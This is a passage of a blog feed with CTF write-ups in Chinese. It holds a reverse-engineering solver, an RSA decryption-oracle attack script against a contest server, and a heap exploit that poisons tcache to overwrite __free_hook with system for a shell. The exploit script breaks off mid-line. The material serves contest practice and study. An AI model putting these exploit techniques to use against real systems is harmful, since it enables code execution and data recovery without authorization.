class="number">0x1f</span>]=(data[(j+<span class="number">3</span>)%<span class="number">0x1f</span>]+data[j])&amp;<span class="number">0xffffffff</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">div2</span><span class="params">(num)</span>:</span></span><br><span class="line"><span class="keyword">return</span> num//<span class="number">2</span></span><br><span class="line"><span class="keyword">print</span> map(hex,map(div2,data))</span><br><span class="line"><span class="keyword">print</span> map(hex,data)</span><br><span class="line">table1=[]</span><br><span class="line">input=<span class="string">'flag&#123;111111111111111111111111111111111111&#125;'</span></span><br><span class="line">input_list=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">42</span>):</span><br><span class="line">input_list.append(ord(input[i])^xor_table[i])</span><br><span class="line">v6=[<span class="number">0</span>]*<span class="number">42</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">42</span>):</span><br><span class="line">table2=[]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">42</span>):</span><br><span class="line"><span class="comment">#print "%x + %x =%x"%(data[(j+3)%0x1f],data[j],data[(j+3)%0x1f]+data[j])</span></span><br><span class="line">data[(i*<span class="number">42</span>+j+<span class="number">3</span>)%<span class="number">0x1f</span>]=(data[(i*<span class="number">42</span>+j+<span class="number">3</span>)%<span class="number">0x1f</span>]+data[(i*<span class="number">42</span>+j)%<span class="number">0x1f</span>])&amp;<span class="number">0xffffffff</span></span><br><span class="line">table2.append((((data[(i*<span class="number">42</span>+j+<span class="number">3</span>)%<span class="number">0x1f</span>]//<span class="number">2</span>)&amp;<span class="number">0xff</span>)+<span class="number">1</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">v6[i]+=table2[j]*input_list[j]</span><br><span class="line">table1.append(table2)</span><br><span class="line">final=[<span class="number">0xbd360</span></span><br><span class="line">,<span class="number">0xb3ec5</span></span><br><span class="line">,<span class="number">0x8d98e</span></span><br><span class="line">,<span class="number">0xcb266</span></span><br><span class="line">,<span class="number">0xb497f</span></span><br><span class="line">,<span class="number">0xa861e</span></span><br><span class="line">,<span class="number">0x97acd</span></span><br><span class="line">,<span class="number">0xbfe57</span></span><br><span class="line">,<span class="number">0xa7d14</span></span><br><span class="line">,<span class="number">0xd4786</span></span><br><span class="line">,<span class="number">0xa3d60</span></span><br><span class="line">,<span class="number">0xac342</span></span><br><span class="line">,<span class="number">0xa9d96</span></span><br><span class="line">,<span class="number">0xb143b</span></span><br><span class="line">,<span class="number">0xa9633</span></span><br><span class="line">,<span class="number">0xb1463</span></span><br><span class="line">,<span class="number">0xc2acc</span></span><br><span class="line">,<span class="number">0xcd008</span></span><br><span class="line">,<span class="number">0xc2d4d</span></span><br><span class="line">,<span class="number">0xbcee2</span></span><br><span class="line">,<span class="number">0xb2cf6</span></span><br><span class="line">,<span class="number">0x9a886</span></span><br><span class="line">,<span class="number">0xb4e48</span></span><br><span class="line">,<span class="number">0xbd5e8</span></span><br><span class="line">,<span class="number">0xad646</span></span><br><span class="line">,<span class="number">0xd1a30</span></span><br><span class="line">,<span class="number">0xa7a1e</span></span><br><span class="line">,<span class="number">0x94a80</span></span><br><span class="line">,<span class="number">0xc6fdc</span></span><br><span class="line">,<span class="number">0x7f5f8</span></span><br><span class="line">,<span class="number">0xa93cd</span></span><br><span class="line">,<span class="number">0x88dc5</span></span><br><span class="line">,<span class="number">0xd816e</span></span><br><span class="line">,<span class="number">0x9b1aa</span></span><br><span class="line">,<span class="number">0xb2c7d</span></span><br><span class="line">,<span class="number">0xbc10e</span></span><br><span class="line">,<span class="number">0xab72d</span></span><br><span class="line">,<span class="number">0x9a7ba</span></span><br><span class="line">,<span class="number">0xcd12a</span></span><br><span class="line">,<span class="number">0xc6a1f</span></span><br><span class="line">,<span class="number">0x9f2d2</span></span><br><span class="line">,<span class="number">0xd5cbd</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calL</span><span class="params">()</span>:</span></span><br><span class="line">    t = []</span><br><span class="line">    tmp=[]</span><br><span class="line">    a=matrix(table1)</span><br><span class="line">    b = matrix(final)</span><br><span class="line">    L =  a.solve_right(b.T)</span><br><span class="line">    L =  L</span><br><span class="line">    <span class="keyword">return</span> L</span><br><span class="line">L  = calL()</span><br><span class="line"><span class="keyword">print</span> L</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line">xor_table=[<span class="number">0xA0</span></span><br><span class="line">,<span class="number">0xE4</span></span><br><span class="line">,<span class="number">0xBA</span></span><br><span class="line">,<span class="number">0xFB</span></span><br><span class="line">,<span class="number">0x10</span></span><br><span class="line">,<span class="number">0xDD</span></span><br><span class="line">,<span class="number">0xAC</span></span><br><span class="line">,<span class="number">0x65</span></span><br><span class="line">,<span class="number">0x8D</span></span><br><span class="line">,<span class="number">0xB</span></span><br><span class="line">,<span class="number">0x57</span></span><br><span class="line">,<span class="number">0x1A</span></span><br><span class="line">,<span class="number">0xE4</span></span><br><span class="line">,<span class="number">0x28</span></span><br><span class="line">,<span class="number">0x96</span></span><br><span class="line">,<span class="number">0xB3</span></span><br><span class="line">,<span class="number">0xC</span></span><br><span class="line">,<span class="number">0x79</span></span><br><span class="line">,<span class="number">0x4D</span></span><br><span class="line">,<span class="number">0x80</span></span><br><span class="line">,<span class="number">0x90</span></span><br><span class="line">,<span class="number">0x99</span></span><br><span class="line">,<span class="number">0x58</span></span><br><span class="line">,<span class="number">0xFE</span></span><br><span class="line">,<span class="number">0x50</span></span><br><span class="line">,<span class="number">0xD3</span></span><br><span class="line">,<span class="number">0xF9</span></span><br><span class="line">,<span class="number">0x3C</span></span><br><span class="line">,<span class="number">0xF</span></span><br><span class="line">,<span class="number">0xC1</span></span><br><span class="line">,<span class="number">0xE3</span></span><br><span class="line">,<span class="number">0xA6</span></span><br><span class="line">,<span class="number">0x39</span></span><br><span class="line">,<span class="number">0xC3</span></span><br><span class="line">,<span class="number">0x28</span></span><br><span class="line">,<span class="number">0x75</span></span><br><span class="line">,<span class="number">0xF8</span></span><br><span class="line">,<span class="number">0xC9</span></span><br><span class="line">,<span class="number">0xC8</span></span><br><span class="line">,<span class="number">0xCD</span></span><br><span class="line">,<span class="number">0x78</span></span><br><span class="line">,<span class="number">0x26</span>]</span><br><span class="line">data=[]</span><br><span class="line">tmp=<span class="number">82</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'key is '</span>,tmp</span><br><span class="line">data.append(tmp)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x1e</span>):</span><br><span class="line">res=<span class="number">16807</span> * (tmp % <span class="number">127773</span>) - <span class="number">2836</span> * (tmp // <span class="number">127773</span>)</span><br><span class="line"><span class="comment">#print hex(abs(res))</span></span><br><span class="line"><span class="keyword">if</span>(res&lt;<span class="number">0</span>):</span><br><span class="line">tmp=res+<span class="number">0x7FFFFFFF</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">tmp=res</span><br><span class="line">data.append(tmp)</span><br><span class="line"><span class="comment">#print map(hex,data)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0x1f</span>):</span><br><span class="line"><span class="comment">#print "%x + %x =%x"%(data[(j+3)%0x1f],data[j],data[(j+3)%0x1f]+data[j])</span></span><br><span class="line">data[(j+<span class="number">3</span>)%<span class="number">0x1f</span>]=(data[(j+<span class="number">3</span>)%<span class="number">0x1f</span>]+data[j])&amp;<span class="number">0xffffffff</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">div2</span><span class="params">(num)</span>:</span></span><br><span class="line"><span class="keyword">return</span> num//<span class="number">2</span></span><br><span class="line"><span class="comment">#print map(hex,map(div2,data))</span></span><br><span class="line"><span class="comment">#print map(hex,data)</span></span><br><span class="line">table1=[]</span><br><span class="line">input=<span class="string">'flag&#123;111111111111111111111111111111111111&#125;'</span></span><br><span class="line">input_list=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">42</span>):</span><br><span class="line">input_list.append(ord(input[i])^xor_table[i])</span><br><span class="line">v6=[<span class="number">0</span>]*<span class="number">42</span></span><br><span class="line">table3=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">42</span>):</span><br><span class="line">table2=[]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">42</span>):</span><br><span class="line"><span class="comment">#print "%x + %x =%x"%(data[(j+3)%0x1f],data[j],data[(j+3)%0x1f]+data[j])</span></span><br><span class="line">data[(i*<span class="number">42</span>+j+<span class="number">3</span>)%<span class="number">0x1f</span>]=(data[(i*<span class="number">42</span>+j+<span class="number">3</span>)%<span class="number">0x1f</span>]+data[(i*<span class="number">42</span>+j)%<span class="number">0x1f</span>])&amp;<span class="number">0xffffffff</span></span><br><span class="line">table2.append((((data[(i*<span class="number">42</span>+j+<span class="number">3</span>)%<span class="number">0x1f</span>]//<span class="number">2</span>)&amp;<span class="number">0xff</span>)+<span class="number">1</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">v6[i]+=table2[j]*input_list[j]</span><br><span class="line">table3.append((((data[(i*<span class="number">42</span>+j+<span class="number">3</span>)%<span class="number">0x1f</span>]//<span class="number">2</span>)&amp;<span class="number">0xff</span>)+<span class="number">1</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">table1.append(table2)</span><br><span class="line">final=[<span class="number">0xbd360</span></span><br><span class="line">,<span class="number">0xb3ec5</span></span><br><span class="line">,<span class="number">0x8d98e</span></span><br><span class="line">,<span class="number">0xcb266</span></span><br><span class="line">,<span class="number">0xb497f</span></span><br><span class="line">,<span class="number">0xa861e</span></span><br><span class="line">,<span class="number">0x97acd</span></span><br><span class="line">,<span class="number">0xbfe57</span></span><br><span class="line">,<span class="number">0xa7d14</span></span><br><span class="line">,<span class="number">0xd4786</span></span><br><span class="line">,<span class="number">0xa3d60</span></span><br><span class="line">,<span class="number">0xac342</span></span><br><span class="line">,<span class="number">0xa9d96</span></span><br><span class="line">,<span class="number">0xb143b</span></span><br><span class="line">,<span class="number">0xa9633</span></span><br><span class="line">,<span class="number">0xb1463</span></span><br><span class="line">,<span class="number">0xc2acc</span></span><br><span class="line">,<span class="number">0xcd008</span></span><br><span class="line">,<span class="number">0xc2d4d</span></span><br><span class="line">,<span class="number">0xbcee2</span></span><br><span class="line">,<span class="number">0xb2cf6</span></span><br><span class="line">,<span class="number">0x9a886</span></span><br><span class="line">,<span class="number">0xb4e48</span></span><br><span class="line">,<span class="number">0xbd5e8</span></span><br><span class="line">,<span class="number">0xad646</span></span><br><span class="line">,<span class="number">0xd1a30</span></span><br><span class="line">,<span class="number">0xa7a1e</span></span><br><span class="line">,<span class="number">0x94a80</span></span><br><span class="line">,<span class="number">0xc6fdc</span></span><br><span class="line">,<span class="number">0x7f5f8</span></span><br><span class="line">,<span class="number">0xa93cd</span></span><br><span class="line">,<span class="number">0x88dc5</span></span><br><span class="line">,<span class="number">0xd816e</span></span><br><span class="line">,<span class="number">0x9b1aa</span></span><br><span class="line">,<span class="number">0xb2c7d</span></span><br><span class="line">,<span class="number">0xbc10e</span></span><br><span class="line">,<span class="number">0xab72d</span></span><br><span class="line">,<span class="number">0x9a7ba</span></span><br><span class="line">,<span class="number">0xcd12a</span></span><br><span class="line">,<span class="number">0xc6a1f</span></span><br><span class="line">,<span class="number">0x9f2d2</span></span><br><span class="line">,<span class="number">0xd5cbd</span></span><br><span class="line">]</span><br><span class="line">a = np.array(table1)</span><br><span class="line">tmp1=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">42</span>):</span><br><span class="line">tmp1.append([final[i]])</span><br><span class="line">b = np.array(tmp1)</span><br><span class="line">x = np.linalg.solve(a, b)</span><br><span class="line"><span class="keyword">print</span> x</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2020华为CTF&quot;&gt;&lt;a href=&quot;#2020华为CTF&quot; class=&quot;headerlink&quot; title=&quot;2020华为CTF&quot;&gt;&lt;/a&gt;2020华为CTF&lt;/h1&gt;&lt;p&gt;三场比赛的时候都没啥时间，匆匆看了几道题&lt;/p&gt;
&lt;h2 id=&quot;第一场&quot;&gt;&lt;a h</summary>
      
    
    
    
    
    <category term="ctf" scheme="http://pidanxu.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2020-11-23Record</title>
    <link href="http://pidanxu.github.io/2020/11/23/2020-11-23Record/"/>
    <id>http://pidanxu.github.io/2020/11/23/2020-11-23Record/</id>
    <published>2020-11-23T11:40:00.000Z</published>
    <updated>2020-11-24T07:13:28.815Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Record"><a href="#Record" class="headerlink" title="Record"></a>Record</h1><p>记录一下最近做的事</p><h2 id="NCTF2020"><a href="#NCTF2020" class="headerlink" title="NCTF2020"></a>NCTF2020</h2><h3 id="Re4"><a href="#Re4" class="headerlink" title="Re4"></a>Re4</h3><p>就是一个代码镂空，这个题的主要麻烦的地方是对提取出来的exe文件的修复。可以看到，解密后提取出来的exe如下。</p><img src="/2020/11/23/2020-11-23Record/1.png"><p>这个是修了一部分的，可以看到010都不能正确识别各section。因为他中间有很多没用的0，具体原因参考<a href="https://blog.csdn.net/u013043103/article/details/108325949。所以从400h开始.text段，然后后面都根据各section来删除0。" target="_blank" rel="noopener">https://blog.csdn.net/u013043103/article/details/108325949。所以从400h开始.text段，然后后面都根据各section来删除0。</a></p><p>修好后如下：</p><img src="/2020/11/23/2020-11-23Record/2.png"><p>然后就是一个简单的rc4和异或。</p><h2 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h2><p>和TWCTF里面一个密码学其中一个考点很像，攻击点在于知道你提供的明文解密后长度是否为128字节，那么构造enc*(2*<em>1016+2\</em>*i-1) ，i是明文最高bit位，从MSB开始泄露。每次判断解密后是否是128字节就能知道该i位是1还是0。从而得到明文。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, GCD</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">r=remote(<span class="string">'42.192.180.50'</span>,<span class="number">30001</span>)</span><br><span class="line">e=r.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">n=r.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">c=r.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">print</span> e,n,c</span><br><span class="line">enc = int(c[:<span class="number">-1</span>], <span class="number">10</span>)</span><br><span class="line">rsa_e=int(e[:<span class="number">-1</span>], <span class="number">10</span>)</span><br><span class="line">N=int(n[:<span class="number">-1</span>], <span class="number">10</span>)</span><br><span class="line"><span class="keyword">print</span> rsa_e,N,enc</span><br><span class="line"><span class="comment"># Check whether the length is 128 bytes, or not.</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(t)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    <span class="comment">#print(t)</span></span><br><span class="line">    r.sendline(t)</span><br><span class="line">    l = r.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">return</span> l.startswith(<span class="string">'F'</span>)</span><br><span class="line">recovered = <span class="number">0</span></span><br><span class="line">two_1016 = <span class="number">2</span> ** <span class="number">1016</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1000</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">    threshold = recovered + <span class="number">2</span> ** i</span><br><span class="line">    tmp = (two_1016 + threshold - <span class="number">1</span>) // threshold</span><br><span class="line">    <span class="comment">#print(tmp * (threshold - 1) &lt; two_1016)</span></span><br><span class="line">    <span class="keyword">assert</span> tmp * (threshold - <span class="number">1</span>) &lt; two_1016, <span class="string">"Failed"</span></span><br><span class="line">    val = (enc * pow(tmp, rsa_e, N) )% N</span><br><span class="line">    res = decrypt(str(val))</span><br><span class="line">    <span class="keyword">print</span> res</span><br><span class="line">    <span class="keyword">if</span> (res):</span><br><span class="line">        recovered += <span class="number">2</span> ** i</span><br><span class="line">m = recovered</span><br><span class="line">print(<span class="string">'message'</span>, m)</span><br></pre></td></tr></table></figure><h3 id="vmpwn"><a href="#vmpwn" class="headerlink" title="vmpwn"></a>vmpwn</h3><p>思路:</p><p>泄露:由于pop动作里判断条件写反了，判断条件应为:ebp&gt;=curstack，所以可以无限去写堆地址以外的地方。首先不断malloc,free。当已经free了0x440(0xf8,0xe8,0xd8…)大小的chunk后，然后垫一个0x28的chunk在下面(为了过free的检查，free的时候检查后一个chunk的size是不是正常值)，此时申请0xf8大小，得到最上面的chunk，然后指针移上去把他的size改为0x441，此时free,chunk进入unsorted bin，然后在申请0x38。从unsorted bin里分割一块，这样fd和bk就是libc地址了，完成泄露。</p><p>利用:tcache attack。和fastbin attack一样。把fd改为free_hook-8，下次再分配，stackbp=’/bin/sh’，然后继续push，free_hook为systemaddr。需要注意的是，free_hook前面的0x38应该再分配出来，然后改他的size，free掉(仍然注意要垫合适的chunk size)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="string">'''00 push</span></span><br><span class="line"><span class="string">01 pop </span></span><br><span class="line"><span class="string">02 nop</span></span><br><span class="line"><span class="string">03 *sp++</span></span><br><span class="line"><span class="string">04 *sp--</span></span><br><span class="line"><span class="string">05 read/write *bp</span></span><br><span class="line"><span class="string">06 new stack</span></span><br><span class="line"><span class="string">07 free stack</span></span><br><span class="line"><span class="string">08 ret'''</span></span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line">context.binary = <span class="string">"./pwn"</span></span><br><span class="line">context.terminal = [<span class="string">"tmux"</span>, <span class="string">"splitw"</span>, <span class="string">"-h"</span>, <span class="string">"-p"</span>, <span class="string">"70"</span>]</span><br><span class="line"><span class="comment"># io = process("./pwn")</span></span><br><span class="line"><span class="comment"># libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process("./pwn", env=&#123;"LD_PRELOAD":"./libc-2.27.so"&#125;)</span></span><br><span class="line">io = remote(<span class="string">"42.192.180.50"</span>, <span class="number">25005</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.27.so"</span>)</span><br><span class="line"></span><br><span class="line">gdb_script = <span class="string">'''</span></span><br><span class="line"><span class="string">b *$rebase(0x115F)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">gdb.attach(io, gdb_script)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute</span><span class="params">(content)</span>:</span></span><br><span class="line">io.recvuntil(<span class="string">":\n"</span>)</span><br><span class="line">io.send(content)</span><br><span class="line"></span><br><span class="line">ins = <span class="string">""</span></span><br><span class="line">ins += p8(<span class="number">6</span>) + p8(<span class="number">0xf8</span>)<span class="comment">#malloc(0xf8)</span></span><br><span class="line">ins += p8(<span class="number">7</span>)<span class="comment">#free()</span></span><br><span class="line">ins += p8(<span class="number">6</span>) + p8(<span class="number">0xe8</span>)<span class="comment">#malloc(0xe8)</span></span><br><span class="line">ins += p8(<span class="number">7</span>)<span class="comment">#free()</span></span><br><span class="line">ins += p8(<span class="number">6</span>) + p8(<span class="number">0xd8</span>)<span class="comment">#malloc(0xd8)</span></span><br><span class="line">ins += p8(<span class="number">7</span>)<span class="comment">#free()</span></span><br><span class="line">ins += p8(<span class="number">6</span>) + p8(<span class="number">0xb8</span>)<span class="comment">#malloc(0xb8)</span></span><br><span class="line">ins += p8(<span class="number">7</span>)<span class="comment">#free()</span></span><br><span class="line">ins += p8(<span class="number">6</span>) + p8(<span class="number">0xa8</span>)<span class="comment">#malloc(0xa8)</span></span><br><span class="line">ins += p8(<span class="number">7</span>)<span class="comment">#free()</span></span><br><span class="line"></span><br><span class="line">ins += p8(<span class="number">6</span>) + p8(<span class="number">0x18</span>)<span class="comment">#malloc(0x18)</span></span><br><span class="line">ins += p8(<span class="number">7</span>)<span class="comment">#free()</span></span><br><span class="line"></span><br><span class="line">ins += p8(<span class="number">6</span>) + p8(<span class="number">0xf8</span>)<span class="comment">#malloc(0xf8)</span></span><br><span class="line">ins += p8(<span class="number">1</span>) + p8(<span class="number">0x40</span>)</span><br><span class="line">ins += p8(<span class="number">0</span>) + p8(<span class="number">0x30</span>) + p32(<span class="number">0x441</span>)</span><br><span class="line"></span><br><span class="line">ins += p8(<span class="number">7</span>)<span class="comment">#free()</span></span><br><span class="line"></span><br><span class="line">ins += p8(<span class="number">6</span>) + p8(<span class="number">0x28</span>)<span class="comment">#malloc(0x28)</span></span><br><span class="line">ins += p8(<span class="number">5</span>) + p8(<span class="number">2</span>)<span class="comment">#write()</span></span><br><span class="line">ins += p8(<span class="number">7</span>)<span class="comment">#free()</span></span><br><span class="line">ins += p8(<span class="number">8</span>)<span class="comment">#end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(hex(len(ins)))</span><br><span class="line"></span><br><span class="line">execute(ins)</span><br><span class="line">libc_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)) - <span class="number">0x3ec0a0</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc addr: "</span> + hex(libc_addr)</span><br><span class="line"></span><br><span class="line">free_hook = libc_addr + libc.symbols[<span class="string">"__free_hook"</span>] - <span class="number">8</span></span><br><span class="line">system_addr = libc_addr + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">ins = <span class="string">""</span></span><br><span class="line">ins += p8(<span class="number">6</span>) + p8(<span class="number">0x38</span>)<span class="comment">#malloc(0x38)</span></span><br><span class="line">ins += p8(<span class="number">7</span>)<span class="comment">#free()</span></span><br><span class="line">ins += p8(<span class="number">6</span>) + p8(<span class="number">0x48</span>)<span class="comment">#malloc(0x48)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">ins += p8(<span class="number">1</span>) + p8(<span class="number">0x40</span>)</span><br><span class="line">ins += p8(<span class="number">0</span>) + p8(<span class="number">0x40</span>) + p64(free_hook)</span><br><span class="line"></span><br><span class="line">ins += p8(<span class="number">7</span>)<span class="comment">#free()</span></span><br><span class="line">ins += p8(<span class="number">6</span>) + p8(<span class="number">0x38</span>)<span class="comment">#malloc(0x38)</span></span><br><span class="line"></span><br><span class="line">ins += p8(<span class="number">1</span>) + p8(<span class="number">0x40</span>)</span><br><span class="line">ins += p8(<span class="number">0</span>) + p8(<span class="number">0x40</span>) + p64(<span class="number">0x91</span>)</span><br><span class="line">ins += p8(<span class="number">7</span>)<span class="comment">#free()</span></span><br><span class="line"></span><br><span class="line">ins += p8(<span class="number">6</span>) + p8(<span 